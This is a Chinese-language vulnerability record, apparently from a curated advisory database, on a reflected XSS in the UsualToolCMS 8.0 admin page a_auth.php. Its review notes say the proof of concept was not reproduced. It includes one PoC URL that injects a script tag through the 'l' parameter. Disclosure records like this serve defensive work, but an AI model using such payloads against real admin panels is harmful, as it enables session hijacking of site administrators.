---
source: "hatch 补库批 20260928"
product: "UsualToolCMS8.0 a_auth"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "UsualToolcms 8.0 后台反射型XSS"
prerequisites: "来源所述条件，未列明部分仍待核：后台授权页面访问角色、受害者打开l参数URL"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-b877a599aa86b6d9ef1993ef"
entity_id: "ve-b877a599aa86b6d9ef1993ef"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台授权页面访问角色、受害者打开l参数URL

- **证据待核（1）**：仅URL和图，无HTML输出上下文/登录态/响应，需核实l如何闭合script。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **事实待核（2）**：有原始先知出处但无修复范围。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# UsualToolcms 8.0 后台反射型XSS

一、漏洞简介
------------

二、漏洞影响
------------

UsualToolcms 8.0

三、复现过程
------------

![1.png](./.resource/UsualToolcms8.0后台反射型XSS/media/rId24.png)

### poc

    https://www.0-sec.org/cmsadmin/a_auth.php?do=update&l=%22%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

![2.png](./.resource/UsualToolcms8.0后台反射型XSS/media/rId26.png)

参考链接
--------

> https://xz.aliyun.com/t/8100
